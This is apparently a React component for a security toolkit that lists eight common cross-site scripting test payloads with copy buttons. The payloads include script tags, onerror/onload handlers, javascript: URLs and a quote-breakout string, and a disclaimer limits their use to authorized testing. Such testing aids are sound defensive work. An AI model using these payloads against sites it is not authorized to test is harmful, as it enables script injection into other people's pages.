import React from 'react';
import { ToolContainer } from '../../common/ToolContainer';
import { ToolHeader } from '../../common/ToolHeader';
import { Card } from '../../common/Card';
import { Button } from '../../common/Button';
import { useCopyToClipboard } from '../../hooks/useCopyToClipboard';

const PAYLOADS = [
    { name: 'Simple Alert', payload: "<script>alert('XSS')</script>" },
    { name: 'Image OnError', payload: "<img src=x onerror=alert('XSS')>" },
    { name: 'SVG OnLoad', payload: "<svg/onload=alert('XSS')>" },
    { name: 'Body OnLoad', payload: "<body onload=alert('XSS')>" },
    { name: 'Iframe Src', payload: "<iframe src=\"javascript:alert('XSS')\"></iframe>" },
    { name: 'Link Href', payload: "<a href=\"javascript:alert('XSS')\">Click Me</a>" },
    { name: 'JS Protocol', payload: "javascript:alert('XSS')" },
    { name: 'Double Quote Escape', payload: "\"/><script>alert('XSS')</script>" },
];

const PayloadRow: React.FC<{ name: string; payload: string }> = ({ name, payload }) => {
    const [isCopied, copy] = useCopyToClipboard();
    return (
        <div className="p-3 border-b border-slate-800 last:border-b-0">
            <p className="text-sm text-slate-300">{name}</p>
            <div className="flex items-center justify-between gap-2 mt-1">
                <code className="text-indigo-300 font-mono text-xs break-all bg-slate-800 p-2 rounded flex-grow">{payload}</code>
                <Button variant="secondary" onClick={() => copy(payload)} className="text-xs px-2 py-1 flex-shrink-0">
                    {isCopied ? 'Copied!' : 'Copy'}
                </Button>
            </div>
        </div>
    );
};

export const XssPayloadGenerator: React.FC = () => {
    return (
        <ToolContainer>
            <ToolHeader title="XSS Payload Generator" description="A collection of common XSS payloads for educational and authorized testing purposes." />
            <Card className="border-l-4 border-yellow-500 bg-yellow-500/10">
                <h4 className="font-bold text-yellow-300">Disclaimer</h4>
                <p className="text-yellow-400 text-sm mt-1">
                    These payloads are for educational use and for testing your own applications. Unauthorized attempts to exploit vulnerabilities on systems you do not own is illegal.
                </p>
            </Card>
            <Card>
                {PAYLOADS.map(p => <PayloadRow key={p.name} name={p.name} payload={p.payload} />)}
            </Card>
        </ToolContainer>
    );
};
